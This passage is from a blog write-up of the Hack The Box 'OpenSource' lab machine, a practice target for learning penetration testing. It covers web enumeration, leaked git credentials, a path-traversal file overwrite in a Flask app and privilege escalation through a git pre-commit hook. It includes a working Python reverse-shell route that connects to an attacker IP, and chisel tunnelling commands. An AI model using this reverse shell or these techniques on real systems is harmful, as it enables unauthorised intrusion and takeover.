+SF:20\x20\x20\x20\&#34;http://www\.w3\.org/TR/html4/strict\.dtd\&#34;&gt;\n&lt;html&gt;\n\x
+SF:20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equ
+SF:iv=\&#34;Content-Type\&#34;\x20content=\&#34;text/html;charset=utf-8\&#34;&gt;\n\x20\x20\x
+SF:20\x20\x20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x2
+SF:0&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;E
+SF:rror\x20response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code
+SF::\x20400&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20req
+SF:uest\x20version\x20\(&#39;RTSP/1\.0&#39;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\
+SF:x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20
+SF:Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20
+SF:\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><ul><li>Web Server</li></ul><p><img src=./images/1.png alt></p><p><img src=./images/2.png alt></p><p><img src=./images/3.png alt></p><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.11.164 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt --no-error
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.11.164
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              txt
+[+] Timeout:                 10s
+===============================================================
+2023/08/28 18:18:08 Starting gobuster in directory enumeration mode
+===============================================================
+/download             (Status: 200) [Size: 2489147]
+/console              (Status: 200) [Size: 1563]
+</code></pre><h2 id=foothold>Foothold</h2><ul><li>If we visit <code>/download</code> we download source files<ul><li>It indicates that the app is running in <code>docker</code> container</li></ul></li></ul><pre tabindex=0><code>└─$ tree -L 2
+.
+├── app
+│   ├── app
+│   ├── INSTALL.md
+│   ├── public
+│   └── run.py
+├── build-docker.sh
+├── config
+│   └── supervisord.conf
+└── Dockerfile
+</code></pre><ul><li>Let&rsquo;s start by analyzing <code>git</code></li></ul><p><img src=./images/4.png alt></p><ul><li><code>dev</code> branch<ul><li><code>git checkout dev</code></li><li>We have proxy creds removed in the third commit: <code>dev01:Soulless_Developer#2022</code></li><li>Also <code>Dockerfile</code> indicates that <code>flask</code> is in debug mode</li></ul></li></ul><p><img src=./images/5.png alt></p><p><img src=./images/6.png alt></p><ul><li>In master branch <code>views.py</code> we have only 2 routes</li></ul><pre tabindex=0><code>import os
+
+from app.utils import get_file_name
+from flask import render_template, request, send_file
+
+from app import app
+
+
+@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def upload_file():
+    if request.method == &#39;POST&#39;:
+        f = request.files[&#39;file&#39;]
+        file_name = get_file_name(f.filename)
+        file_path = os.path.join(os.getcwd(), &#34;public&#34;, &#34;uploads&#34;, file_name)
+        f.save(file_path)
+        return render_template(&#39;success.html&#39;, file_url=request.host_url + &#34;uploads/&#34; + file_name)
+    return render_template(&#39;upload.html&#39;)
+
+
+@app.route(&#39;/uploads/&lt;path:path&gt;&#39;)
+def send_report(path):
+    path = get_file_name(path)
+    return send_file(os.path.join(os.getcwd(), &#34;public&#34;, &#34;uploads&#34;, path))
+</code></pre><ul><li>While in <code>dev</code> branch we have 4<ul><li>Which we see in actual box, so probably <code>dev</code> app is currently running</li><li>Moreover we saw <code>console</code> route also in <code>gobuster</code></li></ul></li></ul><pre tabindex=0><code>import os
+
+from app.utils import get_file_name
+from flask import render_template, request, send_file
+
+from app import app
+
+
+@app.route(&#39;/&#39;)
+def index():
+    return render_template(&#39;index.html&#39;)
+
+
+@app.route(&#39;/download&#39;)
+def download():
+    return send_file(os.path.join(os.getcwd(), &#34;app&#34;, &#34;static&#34;, &#34;source.zip&#34;))
+
+
+@app.route(&#39;/upcloud&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def upload_file():
+    if request.method == &#39;POST&#39;:
+        f = request.files[&#39;file&#39;]
+        file_name = get_file_name(f.filename)
+        file_path = os.path.join(os.getcwd(), &#34;public&#34;, &#34;uploads&#34;, file_name)
+        f.save(file_path)
+        return render_template(&#39;success.html&#39;, file_url=request.host_url + &#34;uploads/&#34; + file_name)
+    return render_template(&#39;upload.html&#39;)
+
+
+@app.route(&#39;/uploads/&lt;path:path&gt;&#39;)
+def send_report(path):
+    path = get_file_name(path)
+    return send_file(os.path.join(os.getcwd(), &#34;public&#34;, &#34;uploads&#34;, path))
+</code></pre><ul><li><code>/console</code></li></ul><p><img src=./images/7.png alt></p><ul><li>We have a potential <code>lfi</code> in <code>upcloud</code> route</li></ul><pre tabindex=0><code>file_name = get_file_name(f.filename)
+file_path = os.path.join(os.getcwd(), &#34;public&#34;, &#34;uploads&#34;, file_name)
+</code></pre><ul><li>If we read the <a href=https://docs.python.org/3.10/library/os.path.html#os.path.join target=_blank rel=noopener>docs</a><ul><li><code>If a segment is an absolute path (which on Windows requires both a drive and a root), then all previous segments are ignored and joining continues from the absolute path segment.</code></li><li>If we visit <code>http://10.10.11.164/uploads//etc/passwd</code>, it results in error</li><li></li></ul></li></ul><p><img src=./images/8.png alt></p><ul><li>We can utilize <code>get_file_name</code> function in <code>utils.py</code>, which replaces <code>../</code><ul><li>So if we send <code>http://10.10.11.164/uploads/..//etc/passwd</code>, it could work</li></ul></li></ul><p><img src=./images/9.png alt></p><ul><li>Since app is running in debug mode, it will reload source files whenever there are changes occur<ul><li>So we can try overwriting <code>views.py</code> using <code>upcloud</code> route (both <code>uploads</code> and <code>upcloud</code> use <code>os.path.join</code>)<ul><li>For example adding one more route with web shell or reverse shell</li></ul></li><li>We know the location of the app is in <code>/app</code> based on <code>Dockerfile</code></li></ul></li></ul><p><img src=./images/10.png alt></p><ul><li>Modify <code>views.py</code><ul><li>Add <code>revshell</code> route with reverse shell code</li></ul></li></ul><pre tabindex=0><code>...
+@app.route(&#39;/revshell&#39;)
+def revshell():
+    import socket
+    import os
+    import pty
+    
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((&#34;10.10.16.5&#34;,6666))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    pty.spawn(&#34;sh&#34;)
+</code></pre><ul><li>Let&rsquo;s start listener and upload malicious source file<ul><li>We need to intercept the request and change the <code>filename</code></li><li>I had weird symbols, but after upgrading the shell they dissappeared</li></ul></li></ul><p><img src=./images/11.png alt></p><p><img src=./images/12.png alt></p><h2 id=user>User</h2><ul><li>Enumerate<ul><li>We know it&rsquo;s a container</li></ul></li></ul><pre tabindex=0><code>/ # ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:07  
+          inet addr:172.17.0.7  Bcast:172.17.255.255  Mask:255.255.0.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:995159 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:994203 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:86315357 (82.3 MiB)  TX bytes:155143921 (147.9 MiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+</code></pre><pre tabindex=0><code>/ # ip route
+default via 172.17.0.1 dev eth0 
+172.17.0.0/16 dev eth0 scope link  src 172.17.0.7 
+</code></pre><ul><li>I was stuck here for a while, until I saw a port <code>3000</code> in <code>nmap</code> results which was filtered<ul><li>So I tried <code>wget</code> that port from container (<code>curl</code> is not installed)</li><li>It&rsquo;s a <code>Gitea</code></li></ul></li></ul><p><img src=./images/13.png alt></p><ul><li>Let&rsquo;s upload <code>chisel</code> and configure port forwarding<ul><li>Container: <code>./chisel client 10.10.16.5:9001 R:3000:172.17.0.1:3000</code>, forward remote(<code>R</code>) port <code>3000</code> (attack box) to <code>172.17.0.1:3000</code></li><li>Attack box: <code>./chisel server -p 9001 --reverse</code></li><li>Now we can check <code>Gitea</code> from our attack box</li></ul></li></ul><p><img src=./images/14.png alt></p><ul><li>Use creds for <code>dev01</code> that were found before<ul><li>We have <code>home-backup</code> repo with <code>.ssh</code> and keys in it</li><li>Let&rsquo;s download them</li></ul></li></ul><p><img src=./images/15.png alt></p><p><img src=./images/16.png alt></p><ul><li><code>ssh</code> using the key<ul><li>Don&rsquo;t forget <code>chmod 600 id_rsa</code></li></ul></li></ul><p><img src=./images/17.png alt></p><h2 id=root>Root</h2><ul><li>No <code>sudo</code> rights<ul><li>Creds for <code>dev01</code> works</li><li><code>linpeas</code> shows <code>git-sync</code> script in <code>/usr/local/bin/</code></li><li><code>pspy</code> also shows the same script running every minute</li></ul></li></ul><p><img src=./images/18.png alt></p><p><img src=./images/19.png alt></p><ul><li>The content of the <code>git-sync</code></li></ul><pre tabindex=0><code>dev01@opensource:/tmp$ cat /usr/local/bin/git-sync 
+#!/bin/bash
+
+cd /home/dev01/
+
+if ! git status --porcelain; then
+    echo &#34;No changes&#34;
+else
+    day=$(date +&#39;%Y-%m-%d&#39;)
+    echo &#34;Changes detected, pushing..&#34;
+    git add .
+    git commit -m &#34;Backup for ${day}&#34;
+    git push origin main
+fi
+</code></pre><ul><li>We can utilize <a href=https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks target=_blank rel=noopener>git-hooks</a><ul><li>So that whenever someone tries to commit <code>dev01</code>&rsquo;s home directory, the custom script will be launched ( because we know that it&rsquo;s being backed up by script above periodically)<ul><li>According to docs, everything with <code>.sample</code> is skipped</li></ul></li></ul></li></ul><p><img src=./images/20.png alt></p><ul><li>Let&rsquo;s create a reverse shell script in <code>hooks</code> directory<ul><li><code>...The pre-commit hook is run first, before you even type in a commit message...</code>, so let&rsquo;s name our script <code>pre-commit</code></li></ul></li></ul><p><img src=./images/21.png alt></p><p><img src=./images/22.png alt></p><ul><li>Get <code>root</code> flag</li></ul><p><img src=./images/23.png alt></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+<a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fopensource%2f&text=%5bHTB%5d%20Machine%3a%20OpenSource&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i></a>
+<a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fopensource%2f&title=%5bHTB%5d%20Machine%3a%20OpenSource" target=_blank><i class="fab fa-reddit"></i></a>
+<a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fopensource%2f&title=%5bHTB%5d%20Machine%3a%20OpenSource" target=_blank><i class="fab fa-linkedin"></i></a>
+<a class="btn btn-sm email-btn" href="mailto:?subject=%5bHTB%5d%20Machine%3a%20OpenSource&body=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fopensource%2f" target=_blank><i class="fas fa-envelope-open-text"></i></a></div><div class="col-md-6 btn-improve-page"><a href=https://github.com/umarbaevB/umarbaevb.github.io/edit/main/content/posts/cybersecurity/hackthebox/machines/linux/opensource/index.md title="Improve this page" target=_blank rel=noopener><i class="fas fa-code-branch"></i>
+Improve this page</a></div></div><hr><div class="row next-prev-navigator"><div class="col-md-6 previous-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/openadmin/ title="[HTB] Machine: OpenAdmin" class="btn btn-outline-info"><div><i class="fas fa-chevron-circle-left"></i> Prev</div><div class=next-prev-text>[HTB] Machine: OpenAdmin</div></a></div><div class="col-md-6 next-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/pandora/ title="[HTB] Machine: Pandora" class="btn btn-outline-info"><div>Next <i class="fas fa-chevron-circle-right"></i></div><div class=next-prev-text>[HTB] Machine: Pandora</div></a></div></div><hr></div></div></div><a id=scroll-to-top class=btn><i class="fas fa-chevron-circle-up"></i></a></section><section class=toc-section id=toc-section><div class=toc-holder><h5 class="text-center pl-3">Table of Contents</h5><hr><div class=toc><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#user>User</a></li><li><a href=#root>Root</a></li></ul></nav></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-left"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#skills>Skills</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#projects>Projects</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#achievements>Courses and Events</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:hrafnulf13@gmail.com target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>hrafnulf13@gmail.com</span></a></li><li><a href=https://github.com/umarbaevB target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>umarbaevB</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-left"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png alt="Toha Theme Logo">
+Toha</a></div><div class="col-md-4 text-center">© 2020 Copyright.</div><div class="col-md-4 text-right"><a id=hugo href=https://gohugo.io/ target=_blank rel=noopener>Powered by
+<img src=/images/hugo-logo.svg alt="Hugo Logo" height=18></a></div></div></div></footer><script src=/application.6ea41b538638987eca0365babdf28c3aa16adbc59643343c39865362e701c943.js integrity="sha256-bqQbU4Y4mH7KA2W6vfKMOqFq28WWQzQ8OYZTYucByUM=" defer></script></body></html>
